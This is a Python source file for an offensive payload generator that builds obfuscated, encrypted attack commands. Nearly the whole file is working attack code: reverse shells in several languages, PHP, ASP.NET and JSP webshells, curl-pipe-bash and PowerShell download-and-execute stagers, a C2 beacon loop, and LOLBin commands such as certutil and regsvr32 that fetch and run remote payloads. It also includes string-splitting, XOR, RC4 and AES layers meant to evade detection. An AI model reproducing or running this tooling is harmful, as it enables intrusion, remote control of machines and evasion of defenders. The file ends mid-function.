"""
Payload Obfuscation Engine

Advanced payload generation with:
- Multiple encoding layers (base64, hex, xor, rc4, aes)
- Obfuscation techniques (string splitting, variable randomization)
- Dead code injection
- Multi-stage payloads
- Living-off-the-land binaries (LOLBins)

NOTE: This is an OBFUSCATION engine, not a true polymorphic engine.
True polymorphism requires machine code generation with instruction
substitution, which is beyond the scope of this module.

For true polymorphism, integrate with:
- Donut (shellcode generation)
- Scarecrow (EDR evasion)
- Custom assemblers (Keystone)

Based on MITRE ATT&CK, red team research, and real-world
techniques used in authorized penetration testing.
"""

import base64
import hashlib
import os
import random
import string
import struct
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
import json

# Optional crypto imports
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as crypto_padding
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class PayloadType(Enum):
    """Types of payloads."""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEBSHELL = "webshell"
    STAGER = "stager"
    BEACON = "beacon"
    EXFILTRATOR = "exfiltrator"
    PERSISTENCE = "persistence"


class EncodingType(Enum):
    """Encoding methods."""
    BASE64 = "base64"
    HEX = "hex"
    XOR = "xor"
    RC4 = "rc4"
    AES = "aes"
    ROT13 = "rot13"
    URL = "url"
    UNICODE = "unicode"
    GZIP_B64 = "gzip_base64"
    DOUBLE_B64 = "double_base64"
    XOR_B64 = "xor_base64"


class TargetOS(Enum):
    """Target operating systems."""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    BSD = "bsd"


class TargetLang(Enum):
    """Target languages/interpreters."""
    BASH = "bash"
    PYTHON = "python"
    PYTHON3 = "python3"
    POWERSHELL = "powershell"
    PHP = "php"
    PERL = "perl"
    RUBY = "ruby"
    NODEJS = "nodejs"
    JAVA = "java"
    CSHARP = "csharp"
    GO = "go"


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    host: str
    port: int
    payload_type: PayloadType = PayloadType.REVERSE_SHELL
    target_os: TargetOS = TargetOS.LINUX
    target_lang: TargetLang = TargetLang.BASH
    encoding: List[EncodingType] = field(default_factory=list)
    obfuscate: bool = True
    staged: bool = False
    obfuscation_level: int = 2  # 0-5
    avoid_strings: List[str] = field(default_factory=list)
    custom_vars: Dict[str, str] = field(default_factory=dict)
    encryption_key: Optional[str] = None  # For AES/RC4


@dataclass
class GeneratedPayload:
    """Generated payload result."""
    payload: str
    decoder: str
    execution_command: str
    encoding_chain: List[str]
    fingerprint: str
    encryption_key: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class RC4:
    """RC4 stream cipher implementation."""

    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        """Encrypt data using RC4."""
        S = list(range(256))
        j = 0
        key_len = len(key)

        # Key scheduling
        for i in range(256):
            j = (j + S[i] + key[i % key_len]) % 256
            S[i], S[j] = S[j], S[i]

        # Encryption
        i = j = 0
        result = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)

        return bytes(result)

    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        """Decrypt data using RC4 (symmetric)."""
        return RC4.encrypt(data, key)


class AESCrypto:
    """AES encryption wrapper."""

    @staticmethod
    def encrypt(data: bytes, key: bytes) -> Tuple[bytes, bytes]:
        """
        Encrypt data using AES-256-CBC.

        Returns:
            Tuple of (iv, ciphertext)
        """
        if not HAS_CRYPTO:
            raise ImportError("cryptography library required for AES")

        # Ensure key is 32 bytes (256 bits)
        key = hashlib.sha256(key).digest()

        # Generate random IV
        iv = os.urandom(16)

        # Pad data to block size
        padder = crypto_padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        return iv, ciphertext

    @staticmethod
    def decrypt(iv: bytes, ciphertext: bytes, key: bytes) -> bytes:
        """Decrypt AES-256-CBC encrypted data."""
        if not HAS_CRYPTO:
            raise ImportError("cryptography library required for AES")

        key = hashlib.sha256(key).digest()

        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()

        # Unpad
        unpadder = crypto_padding.PKCS7(128).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()

        return data


class ObfuscationEngine:
    """
    Payload obfuscation engine.

    Provides various obfuscation techniques:
    - String splitting and concatenation
    - Variable name randomization
    - Dead code injection
    - Whitespace manipulation
    - Character encoding tricks
    """

    def __init__(self):
        self.var_counter = 0
        self.char_pool = string.ascii_letters

    def random_var(self, prefix: str = "v", length: int = 6) -> str:
        """Generate random variable name."""
        self.var_counter += 1
        suffix = ''.join(random.choices(self.char_pool, k=length))
        return f"{prefix}{suffix}{self.var_counter}"

    def add_random_whitespace(self, payload: str, lang: TargetLang) -> str:
        """Add random whitespace where syntactically valid."""
        if lang == TargetLang.BASH:
            # Add spaces around operators and semicolons
            operators = ['|', '&', ';', '>', '<']
            for op in operators:
                if op in payload:
                    spaces = ' ' * random.randint(0, 2)
                    payload = payload.replace(op, f'{spaces}{op}{spaces}')
            return payload

        elif lang == TargetLang.POWERSHELL:
            # Add backticks (line continuation) randomly
            # PowerShell ignores backticks followed by newlines
            words = payload.split()
            result = []
            for word in words:
                if len(word) > 4 and random.random() > 0.7:
                    # Insert backtick in the middle of long words
                    mid = len(word) // 2
                    word = word[:mid] + '`' + word[mid:]
                result.append(word)
            return ' '.join(result)

        elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            # Add spaces around operators
            payload = re.sub(r'([=,;])', r' \1 ', payload)
            return payload

        return payload

    def split_strings_powershell(self, payload: str) -> str:
        """Split strings in PowerShell for obfuscation."""
        # Common strings to split
        split_targets = {
            'System': "('Sy'+'stem')",
            'Object': "('Ob'+'ject')",
            'Socket': "('So'+'cket')",
            'TCPClient': "('TCP'+'Client')",
            'Download': "('Down'+'load')",
            'String': "('Str'+'ing')",
            'WebClient': "('Web'+'Client')",
            'GetStream': "('Get'+'Stream')",
            'Process': "('Pro'+'cess')",
            'Start': "('St'+'art')",
            'Invoke': "('In'+'voke')",
            'Expression': "('Exp'+'ression')",
            'Command': "('Com'+'mand')",
        }

        for original, replacement in split_targets.items():
            if original in payload:
                # Only replace some occurrences for variety
                if random.random() > 0.3:
                    payload = payload.replace(original, replacement, 1)

        return payload

    def split_strings_bash(self, payload: str) -> str:
        """Split strings in bash using various techniques."""
        techniques = [
            # Empty quote insertion
            ('/bin/sh', '/bi""n/s""h'),
            ('/bin/bash', '/bi""n/ba""sh'),
            ('bash', 'ba""sh'),
            ('curl', 'cu""rl'),
            ('wget', 'wg""et'),
            # Variable insertion
            ('/dev/tcp', '/dev/t${x}cp'.replace('${x}', '${IFS:0:0}')),
        ]

        for original, replacement in techniques:
            if original in payload:
                if random.random() > 0.4:
                    payload = payload.replace(original, replacement, 1)

        return payload

    def split_strings_python(self, payload: str) -> str:
        """Split strings in Python."""
        # Find string literals and split them
        # Example: "socket" -> "soc"+"ket"

        def split_string(match):
            s = match.group(1)
            if len(s) > 4:
                mid = len(s) // 2
                return f'"{s[:mid]}"+"{ s[mid:]}"'
            return match.group(0)

        # Split double-quoted strings
        payload = re.sub(r'"([^"]{5,})"', split_string, payload)
        return payload

    def inject_dead_code(self, payload: str, lang: TargetLang) -> str:
        """Inject harmless dead code."""
        if lang == TargetLang.POWERSHELL:
            dead_code_options = [
                "$null = $null",
                "[void]$null",
                "if($false){$x=1}",
                "$_=$null",
                "[int]$_=0",
                "try{}catch{}",
                "$ErrorActionPreference=$ErrorActionPreference",
            ]
            dead = random.choice(dead_code_options)
            return f"{dead};{payload}"

        elif lang == TargetLang.BASH:
            dead_code_options = [
                "true",
                ": 'nop'",
                "echo>/dev/null",
                "[ 1 ]",
                "test 1",
                "_=''",
                "declare -r _",
            ]
            dead = random.choice(dead_code_options)
            # Insert at beginning or middle
            if random.random() > 0.5 and ';' in payload:
                parts = payload.split(';', 1)
                return f"{parts[0]};{dead};{parts[1]}"
            return f"{dead};{payload}"

        elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            dead_code_options = [
                "pass",
                "_=None",
                "0 if False else 0",
                "(lambda:None)()",
            ]
            dead = random.choice(dead_code_options)
            return f"{dead};{payload}"

        elif lang == TargetLang.PHP:
            dead_code_options = [
                "$_=null;",
                "if(false){}",
                "@$_=0;",
            ]
            dead = random.choice(dead_code_options)
            # Insert after <?php
            if '<?php' in payload:
                return payload.replace('<?php', f'<?php {dead}', 1)
            return f"{dead}{payload}"

        return payload

    def substitute_variables(self, payload: str, lang: TargetLang) -> str:
        """Replace string literals with variables."""
        if lang == TargetLang.POWERSHELL:
            # Extract common strings and replace with variables
            substitutions = {}
            prefix = ""

            # Find patterns like '.GetStream()' and replace
            patterns_to_replace = [
                ('System.Net.Sockets.TCPClient', 'System.Net.Sockets.TCPClient'),
                ('System.Text.Encoding', 'System.Text.Encoding'),
                ('ASCII', 'ASCII'),
            ]

            for pattern, _ in patterns_to_replace:
                if pattern in payload:
                    var_name = self.random_var('$s')
                    substitutions[pattern] = var_name
                    prefix += f"{var_name}='{pattern}';"

            for original, var in substitutions.items():
                payload = payload.replace(f"'{original}'", var)
                payload = payload.replace(original, f"$({var})")

            if prefix:
                return prefix + payload
            return payload

        elif lang == TargetLang.BASH:
            substitutions = {}
            prefix = ""

            targets = ['/bin/sh', '/bin/bash', '/dev/tcp']
            for target in targets:
                if target in payload:
                    var_name = self.random_var('_')
                    substitutions[target] = f'${{{var_name}}}'
                    prefix += f'{var_name}="{target}";'

            for original, var in substitutions.items():
                payload = payload.replace(original, var)

            if prefix:
                return prefix + payload
            return payload

        elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            # Use exec with locals() manipulation
            substitutions = {}

            targets = ['socket', 'subprocess', 'os']
            found_any = False

            for target in targets:
                if f"import {target}" in payload:
                    found_any = True

            if found_any:
                # Use __import__ instead of import
                payload = re.sub(
                    r'import (\w+)',
                    lambda m: f"{m.group(1)}=__import__('{m.group(1)}')",
                    payload
                )

            return payload

        return payload

    def encode_chars_powershell(self, payload: str) -> str:
        """Use char encoding in PowerShell."""
        # Convert some characters to [char] format
        # Example: 'a' -> [char]97

        def encode_char(c: str) -> str:
            if random.random() > 0.7:  # Only encode some chars
                return f"[char]{ord(c)}"
            return c

        # Only encode in string contexts - this is simplified
        result = []
        in_string = False
        quote_char = None

        for c in payload:
            if c in '"\'':
                if not in_string:
                    in_string = True
                    quote_char = c
                elif c == quote_char:
                    in_string = False
                result.append(c)
            elif in_string and c.isalpha() and random.random() > 0.85:
                result.append(f"'+[char]{ord(c)}+'")
            else:
                result.append(c)

        return ''.join(result)

    def randomize_case_powershell(self, payload: str) -> str:
        """Randomize case in PowerShell (case-insensitive)."""
        result = []
        in_string = False
        quote_char = None

        for c in payload:
            if c in '"\'':
                if not in_string:
                    in_string = True
                    quote_char = c
                elif c == quote_char:
                    in_string = False
                result.append(c)
            elif not in_string and c.isalpha():
                # Randomize case outside strings
                if random.random() > 0.5:
                    result.append(c.upper())
                else:
                    result.append(c.lower())
            else:
                result.append(c)

        return ''.join(result)

    def obfuscate(self, payload: str, config: PayloadConfig) -> str:
        """Apply all obfuscation techniques based on level."""
        level = config.obfuscation_level
        lang = config.target_lang

        if level >= 1:
            payload = self.add_random_whitespace(payload, lang)

        if level >= 2:
            if lang == TargetLang.POWERSHELL:
                payload = self.split_strings_powershell(payload)
            elif lang == TargetLang.BASH:
                payload = self.split_strings_bash(payload)
            elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
                payload = self.split_strings_python(payload)

        if level >= 3:
            payload = self.inject_dead_code(payload, lang)

        if level >= 4:
            payload = self.substitute_variables(payload, lang)

        if level >= 5:
            if lang == TargetLang.POWERSHELL:
                payload = self.encode_chars_powershell(payload)
                payload = self.randomize_case_powershell(payload)

        return payload


class PayloadGenerator:
    """
    Payload generation engine.

    Generates various payload types with templates.
    """

    def __init__(self, obfuscator: ObfuscationEngine):
        self.obfuscator = obfuscator

    def generate_reverse_shell(self, config: PayloadConfig) -> str:
        """Generate reverse shell payload."""
        host = config.host
        port = config.port

        if config.target_lang == TargetLang.BASH:
            variants = [
                f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
                f'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
                f'0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196',
                f'/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1',
                f'sh -i >& /dev/udp/{host}/{port} 0>&1',
            ]
            return random.choice(variants)

        elif config.target_lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            py_cmd = "python3" if config.target_lang == TargetLang.PYTHON3 else "python"
            sock_var = self.obfuscator.random_var('s')
            os_var = self.obfuscator.random_var('o')
            sub_var = self.obfuscator.random_var('p')

            variants = [
                f'{py_cmd} -c \'import socket,subprocess,os;{sock_var}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);{sock_var}.connect(("{host}",{port}));os.dup2({sock_var}.fileno(),0);os.dup2({sock_var}.fileno(),1);os.dup2({sock_var}.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                f'{py_cmd} -c \'import socket as {sock_var},os as {os_var},subprocess as {sub_var};a={sock_var}.socket({sock_var}.AF_INET,{sock_var}.SOCK_STREAM);a.connect(("{host}",{port}));{os_var}.dup2(a.fileno(),0);{os_var}.dup2(a.fileno(),1);{os_var}.dup2(a.fileno(),2);{sub_var}.Popen(["/bin/sh","-i"])\'',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.POWERSHELL:
            client_var = self.obfuscator.random_var('c')
            stream_var = self.obfuscator.random_var('s')
            bytes_var = self.obfuscator.random_var('b')
            data_var = self.obfuscator.random_var('d')

            payload = f'''${client_var}=New-Object System.Net.Sockets.TCPClient('{host}',{port});${stream_var}=${client_var}.GetStream();[byte[]]${bytes_var}=0..65535|%{{0}};while((${stream_var}.Read(${bytes_var},0,${bytes_var}.Length))-ne 0){{${data_var}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${bytes_var},0,$i);$sendback=(iex ${data_var} 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);${stream_var}.Write($sendbyte,0,$sendbyte.Length);${stream_var}.Flush()}};${client_var}.Close()'''
            return payload

        elif config.target_lang == TargetLang.PHP:
            variants = [
                f'<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");?>',
                f'<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"{host}",{port});$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);?>',
                f'<?php $s=fsockopen("{host}",{port});$proc=proc_open("/bin/sh",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);?>',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.PERL:
            return f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',

        elif config.target_lang == TargetLang.RUBY:
            return f'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''

        elif config.target_lang == TargetLang.NODEJS:
            return f'''require('child_process').exec('bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"')'''

        # Default
        return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'

    def generate_webshell(self, config: PayloadConfig) -> str:
        """Generate webshell payload."""
        cmd_var = self.obfuscator.random_var('c')
        out_var = self.obfuscator.random_var('o')
        func_name = self.obfuscator.random_var('f')

        if config.target_lang == TargetLang.PHP:
            variants = [
                f'<?php ${cmd_var}=$_GET["c"];${out_var}=shell_exec(${cmd_var});echo ${out_var};?>',
                f'<?php @eval(base64_decode($_POST["x"]));?>',
                f'<?php ${func_name}="sys"."tem";${func_name}($_GET["c"]);?>',
                f'<?php $d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open($_GET["c"],$d,$pipes);echo stream_get_contents($pipes[1]);?>',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.CSHARP:
            return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["c"];
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>'''

        elif config.target_lang == TargetLang.JAVA:
            return f'''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String s;
while((s=br.readLine())!=null){{out.println(s);}}
%>'''

        return f'<?php system($_GET["c"]);?>'

    def generate_stager(self, config: PayloadConfig) -> str:
        """Generate multi-stage stager."""
        host = config.host
        port = config.port

        if config.target_lang == TargetLang.POWERSHELL:
            variants = [
                f"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/stage2.ps1')",
                f"IEX(IWR -Uri 'http://{host}:{port}/stage2.ps1' -UseBasicParsing).Content",
                f"$c=New-Object System.Net.WebClient;$c.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$c.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX($c.DownloadString('http://{host}:{port}/stage2.ps1'))",
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.BASH:
            variants = [
                f"curl -s http://{host}:{port}/stage2.sh | bash",
                f"wget -q -O - http://{host}:{port}/stage2.sh | bash",
                f"bash -c 'bash -i < /dev/tcp/{host}/{port}'",
            ]
            return random.choice(variants)

        elif config.target_lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            py = "python3" if config.target_lang == TargetLang.PYTHON3 else "python"
            return f"{py} -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{host}:{port}/stage2.py\").read())'"

        return f"curl http://{host}:{port}/stage2 | sh"

    def generate_beacon(self, config: PayloadConfig) -> str:
        """Generate C2 beacon payload."""
        host = config.host
        port = config.port
        sleep_time = random.randint(30, 120)
        jitter = random.randint(5, 20)

        if config.target_lang == TargetLang.BASH:
            return f'''while true; do
  sleep $(( {sleep_time} + RANDOM % {jitter} ))
  cmd=$(curl -s http://{host}:{port}/tasks/$(hostname))
  if [ -n "$cmd" ]; then
    result=$(eval "$cmd" 2>&1)
    curl -s -X POST -d "$result" http://{host}:{port}/results/$(hostname)
  fi
done'''

        elif config.target_lang == TargetLang.POWERSHELL:
            return f'''while($true){{
  Start-Sleep -Seconds {sleep_time}
  try{{
    $cmd = (IWR -Uri "http://{host}:{port}/tasks/$env:COMPUTERNAME" -UseBasicParsing).Content
    if($cmd){{
      $result = IEX $cmd 2>&1 | Out-String
      IWR -Uri "http://{host}:{port}/results/$env:COMPUTERNAME" -Method POST -Body $result -UseBasicParsing
    }}
  }}catch{{}}
}}'''

        return ""


class PolymorphicGenerator:
    """
    Payload Obfuscation Generator.

    This is an obfuscation engine, NOT a true polymorphic engine.
    It provides:
    - Multi-layer encoding
    - String obfuscation
    - Dead code injection
    - Variable randomization

    For true polymorphism, integrate with shellcode generators.
    """

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
        self.obfuscator = ObfuscationEngine()
        self.payload_gen = PayloadGenerator(self.obfuscator)

    def generate(self, config: PayloadConfig) -> GeneratedPayload:
        """
        Generate an obfuscated payload.

        Args:
            config: Payload configuration

        Returns:
            GeneratedPayload with payload and execution info
        """
        # Generate base payload
        base_payload = self._generate_base_payload(config)

        # Apply obfuscation
        if config.obfuscate and config.obfuscation_level > 0:
            base_payload = self.obfuscator.obfuscate(base_payload, config)

        # Apply encoding chain
        encoded_payload = base_payload
        encoding_chain = []
        encryption_key = config.encryption_key

        for encoding in config.encoding:
            encoded_payload, enc_type, key = self._apply_encoding(
                encoded_payload, encoding, config
            )
            encoding_chain.append(enc_type)
            if key:
                encryption_key = key

        # Generate decoder stub
        decoder = self._generate_decoder(encoding_chain, config, encryption_key)

        # Generate execution command
        exec_cmd = self._generate_exec_command(encoded_payload, decoder, config)

        # Create fingerprint
        fingerprint = hashlib.sha256(
            (base_payload + str(encoding_chain)).encode()
        ).hexdigest()[:16]

        return GeneratedPayload(
            payload=encoded_payload,
            decoder=decoder,
            execution_command=exec_cmd,
            encoding_chain=encoding_chain,
            fingerprint=fingerprint,
            encryption_key=encryption_key,
            metadata={
                "target_os": config.target_os.value,
                "target_lang": config.target_lang.value,
                "obfuscation_level": config.obfuscation_level,
                "staged": config.staged,
                "warning": "This is obfuscation, not true polymorphism"
            }
        )

    def _generate_base_payload(self, config: PayloadConfig) -> str:
        """Generate base payload before encoding."""
        if config.payload_type == PayloadType.REVERSE_SHELL:
            return self.payload_gen.generate_reverse_shell(config)
        elif config.payload_type == PayloadType.WEBSHELL:
            return self.payload_gen.generate_webshell(config)
        elif config.payload_type == PayloadType.STAGER:
            return self.payload_gen.generate_stager(config)
        elif config.payload_type == PayloadType.BEACON:
            return self.payload_gen.generate_beacon(config)
        else:
            return self.payload_gen.generate_reverse_shell(config)

    def _apply_encoding(
        self,
        payload: str,
        encoding: EncodingType,
        config: PayloadConfig
    ) -> Tuple[str, str, Optional[str]]:
        """
        Apply single encoding layer.

        Returns:
            Tuple of (encoded_payload, encoding_type, key_if_applicable)
        """
        key = None

        if encoding == EncodingType.BASE64:
            encoded = base64.b64encode(payload.encode()).decode()
            return encoded, "base64", None

        elif encoding == EncodingType.DOUBLE_B64:
            encoded = base64.b64encode(payload.encode()).decode()
            encoded = base64.b64encode(encoded.encode()).decode()
            return encoded, "double_base64", None

        elif encoding == EncodingType.HEX:
            encoded = payload.encode().hex()
            return encoded, "hex", None

        elif encoding == EncodingType.XOR:
            key_byte = random.randint(1, 255)
            encoded_bytes = bytes([b ^ key_byte for b in payload.encode()])
            encoded = base64.b64encode(encoded_bytes).decode()
            return f"{key_byte}:{encoded}", "xor", str(key_byte)

        elif encoding == EncodingType.XOR_B64:
            # XOR then base64 with recoverable key
            key_byte = random.randint(1, 255)
            encoded_bytes = bytes([b ^ key_byte for b in payload.encode()])
            encoded = base64.b64encode(encoded_bytes).decode()
            # Prepend key as first byte
            key_b64 = base64.b64encode(bytes([key_byte])).decode()
            return f"{key_b64}{encoded}", "xor_base64", str(key_byte)

        elif encoding == EncodingType.RC4:
            key = config.encryption_key or ''.join(
                random.choices(string.ascii_letters + string.digits, k=16)
            )
            encrypted = RC4.encrypt(payload.encode(), key.encode())
            encoded = base64.b64encode(encrypted).decode()
            return encoded, "rc4", key

        elif encoding == EncodingType.AES:
            if not HAS_CRYPTO:
                # Fall back to XOR if no crypto library
                return self._apply_encoding(payload, EncodingType.XOR, config)

            key = config.encryption_key or ''.join(
                random.choices(string.ascii_letters + string.digits, k=32)
            )
            iv, ciphertext = AESCrypto.encrypt(payload.encode(), key.encode())
            # Combine IV and ciphertext
            combined = iv + ciphertext
            encoded = base64.b64encode(combined).decode()
            return encoded, "aes", key

        elif encoding == EncodingType.ROT13:
            import codecs
            encoded = codecs.encode(payload, 'rot_13')
            return encoded, "rot13", None

        elif encoding == EncodingType.URL:
            from urllib.parse import quote
            encoded = quote(payload, safe='')
            return encoded, "url", None

        elif encoding == EncodingType.UNICODE:
            encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
            return encoded, "unicode", None

        elif encoding == EncodingType.GZIP_B64:
            import gzip
            compressed = gzip.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            return encoded, "gzip_base64", None

        return payload, "none", None

    def _generate_decoder(
        self,
        encoding_chain: List[str],
        config: PayloadConfig,
        key: Optional[str] = None
    ) -> str:
        """Generate decoder stub for encoding chain."""
        if not encoding_chain:
            return ""

        lang = config.target_lang

        if lang == TargetLang.BASH:
            decoder = ""
            for enc in reversed(encoding_chain):
                if enc == "base64":
                    decoder += " | base64 -d"
                elif enc == "double_base64":
                    decoder += " | base64 -d | base64 -d"
                elif enc == "hex":
                    decoder += " | xxd -r -p"
                elif enc == "gzip_base64":
                    decoder += " | base64 -d | gunzip"
                elif enc == "xor":
                    decoder += " | { IFS=: read key data; echo $data | base64 -d | python3 -c 'import sys; k=int(sys.argv[1]); sys.stdout.buffer.write(bytes([b^k for b in sys.stdin.buffer.read()]))' $key; }"
                elif enc == "rot13":
                    decoder += " | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
                elif enc == "rc4" and key:
                    decoder += f" | base64 -d | python3 -c 'import sys;k=\"{key}\".encode();S=list(range(256));j=0\nfor i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\ni=j=0;r=[]\nfor b in sys.stdin.buffer.read():i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];r.append(b^S[(S[i]+S[j])%256])\nsys.stdout.buffer.write(bytes(r))'"
                elif enc == "aes" and key:
                    decoder += f" | python3 -c 'from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes;from cryptography.hazmat.primitives import padding;import base64,hashlib,sys;d=base64.b64decode(sys.stdin.read());k=hashlib.sha256(\"{key}\".encode()).digest();iv,ct=d[:16],d[16:];c=Cipher(algorithms.AES(k),modes.CBC(iv));dec=c.decryptor();pd=dec.update(ct)+dec.finalize();u=padding.PKCS7(128).unpadder();print((u.update(pd)+u.finalize()).decode())'"
            return decoder

        elif lang == TargetLang.POWERSHELL:
            decoders = []
            for enc in reversed(encoding_chain):
                if enc in ["base64", "double_base64"]:
                    decoders.append("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))")
                elif enc == "xor" and key:
                    decoders.append(f"$k={key};$b=[System.Convert]::FromBase64String($encoded);$r=@();for($i=0;$i-lt$b.Length;$i++){{$r+=$b[$i]-bxor$k}};[System.Text.Encoding]::UTF8.GetString($r)")
            return "; ".join(decoders) if decoders else ""

        elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            decoders = []
            for enc in reversed(encoding_chain):
                if enc == "base64":
                    decoders.append("import base64;d=base64.b64decode(d)")
                elif enc == "xor" and key:
                    decoders.append(f"d=bytes([b^{key} for b in d])")
            return ";".join(decoders) if decoders else ""

        return ""

    def _generate_exec_command(
        self,
        payload: str,
        decoder: str,
        config: PayloadConfig
    ) -> str:
        """Generate full execution command."""
        lang = config.target_lang

        if lang == TargetLang.BASH:
            if decoder:
                return f'echo "{payload}"{decoder} | bash'
            return payload

        elif lang == TargetLang.POWERSHELL:
            if EncodingType.BASE64 in config.encoding:
                return f'powershell -enc {payload}'
            return f'powershell -c "{payload}"'

        elif lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            py = "python3" if lang == TargetLang.PYTHON3 else "python"
            if EncodingType.BASE64 in config.encoding:
                return f'{py} -c "import base64;exec(base64.b64decode(\'{payload}\'))"'
            return payload

        return payload

    def generate_lolbin_command(self, config: PayloadConfig) -> Dict[str, str]:
        """
        Generate Living-off-the-Land Binary commands.

        Returns:
            Dictionary of LOLBin techniques
        """
        host = config.host
        port = config.port
        lolbins = {}

        if config.target_os == TargetOS.WINDOWS:
            lolbins["certutil"] = f"certutil -urlcache -split -f http://{host}:{port}/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe"
            lolbins["bitsadmin"] = f"bitsadmin /transfer job /download /priority high http://{host}:{port}/payload.exe %TEMP%\\payload.exe"
            lolbins["mshta"] = f"mshta http://{host}:{port}/payload.hta"
            lolbins["regsvr32"] = f"regsvr32 /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll"
            lolbins["rundll32"] = f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/payload.ps1')\")"
            lolbins["msiexec"] = f"msiexec /q /i http://{host}:{port}/payload.msi"
            lolbins["wmic"] = f"wmic os get /format:\"http://{host}:{port}/payload.xsl\""
            lolbins["forfiles"] = f"forfiles /p c:\\windows\\system32 /m notepad.exe /c \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/payload.ps1')\""
            lolbins["cmstp"] = f"cmstp.exe /s /ns http://{host}:{port}/payload.inf"

        elif config.target_os == TargetOS.LINUX:
            lolbins["curl"] = f"curl http://{host}:{port}/payload.sh | bash"
            lolbins["wget"] = f"wget -q -O - http://{host}:{port}/payload.sh | bash"
            lolbins["python"] = f"python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{host}:{port}/payload.py\").read())'"
            lolbins["perl"] = f"perl -e 'use LWP::Simple;eval(get(\"http://{host}:{port}/payload.pl\"));'"
            lolbins["ruby"] = f"ruby -e \"require 'net/http';eval(Net::HTTP.get(URI('http://{host}:{port}/payload.rb')))\""
            lolbins["php"] = f"php -r 'eval(file_get_contents(\"http://{host}:{port}/payload.php\"));'"
